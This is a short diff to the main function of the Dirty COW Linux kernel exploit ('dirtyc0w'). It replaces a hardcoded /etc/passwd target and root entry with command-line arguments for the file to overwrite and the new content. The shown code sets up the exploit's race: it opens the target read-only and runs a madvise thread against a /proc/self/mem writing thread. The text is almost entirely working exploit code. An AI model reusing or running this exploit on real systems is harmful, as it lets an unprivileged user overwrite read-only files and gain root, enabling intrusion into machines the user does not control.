@@ -76,16 +76,17 @@ int main(int argc,char *argv[])
 /*
 You have to pass two arguments. File and Contents.
 */
-  char file_name[] = "/etc/passwd";
-  char file_content[] = "root:x:0:0:root:/root:/bin/bash";
-
+  if (argc<3) {
+  (void)fprintf(stderr, "%s\n",
+      "usage: dirtyc0w target_file new_content");
+  return 1; }
   pthread_t pth1,pth2;
 /*
 You have to open the file in read only mode.
 */
-  f=open(file_name,O_RDONLY);
+  f=open(argv[1],O_RDONLY);
   fstat(f,&st);
-  name=file_name;
+  name=argv[1];
 /*
 You have to use MAP_PRIVATE for copy-on-write mapping.
 > Create a private copy-on-write mapping.  Updates to the
@@ -102,8 +103,8 @@ You have to open with PROT_READ.
 /*
 You have to do it on two threads.
 */
-  pthread_create(&pth1,NULL,madviseThread,file_name);
-  pthread_create(&pth2,NULL,procselfmemThread,file_content);
+  pthread_create(&pth1,NULL,madviseThread,argv[1]);
+  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
 /*
 You have to wait for the threads to finish.
 */
